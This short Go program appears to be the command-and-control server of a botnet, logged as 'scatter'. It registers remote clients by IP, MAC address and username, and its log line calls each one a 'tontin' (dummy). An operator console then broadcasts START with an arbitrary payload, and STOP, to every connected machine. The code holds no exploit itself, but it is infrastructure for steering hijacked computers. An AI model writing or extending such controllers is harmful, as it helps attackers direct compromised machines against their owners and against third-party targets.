package main

import (
	"bufio"
	"fmt"
	"log"
	"net/http"
	"os"
	"sync"
	"time"

	"github.com/gorilla/websocket"
)

type ClientInfo struct {
	IP        string    `json:"ip"`
	MAC       string    `json:"mac"`
	Username  string    `json:"username"`
	Connected time.Time `json:"connected"`
}

type Client struct {
	Conn *websocket.Conn
	Info ClientInfo
}

var (
	clients   = make(map[*websocket.Conn]Client)
	clientsMu sync.Mutex
	upgrader  = websocket.Upgrader{
		CheckOrigin: func(r *http.Request) bool { return true },
	}
)

func wsHandler(w http.ResponseWriter, r *http.Request) {
	conn, err := upgrader.Upgrade(w, r, nil)
	if err != nil {
		return
	}
	defer conn.Close()

	var info ClientInfo
	if err := conn.ReadJSON(&info); err != nil {
		return
	}
	info.Connected = time.Now()

	clientsMu.Lock()
	clients[conn] = Client{Conn: conn, Info: info}
	clientsMu.Unlock()

	log.Println("🟢 - tontin conectao:", info.Username, info.IP)

	for {
		if _, _, err := conn.ReadMessage(); err != nil {
			clientsMu.Lock()
			delete(clients, conn)
			clientsMu.Unlock()
			break
		}
	}
}

func broadcast(action, payload string) {
	clientsMu.Lock()
	defer clientsMu.Unlock()

	msg := map[string]string{
		"action": action,
	}

	if payload != "" {
		msg["payload"] = payload
	}

	for conn := range clients {
		_ = conn.WriteJSON(msg)
	}
}
 //=======================
 //	esta es la terminal interactiva
func consoleLoop() {
	reader := bufio.NewReader(os.Stdin)

	for {
		fmt.Print("\n[s] START  [x] STOP  [q] SALIR > ")
		cmd, _ := reader.ReadString('\n')

		switch cmd[0] {
		case 's':
			fmt.Print("payload: ")
			payload, _ := reader.ReadString('\n')
			payload = payload[:len(payload)-1]

			broadcast("START", payload)
			fmt.Println("START enviado")

		case 'x':
			broadcast("STOP", "")
			fmt.Println("STOP enviado")

		case 'q':
			os.Exit(0)
		}
	}
}

func main() {
	http.HandleFunc("/ws", wsHandler)
	go consoleLoop()

	log.Println("scatter :8080")
	log.Fatal(http.ListenAndServe(":8080", nil))
}
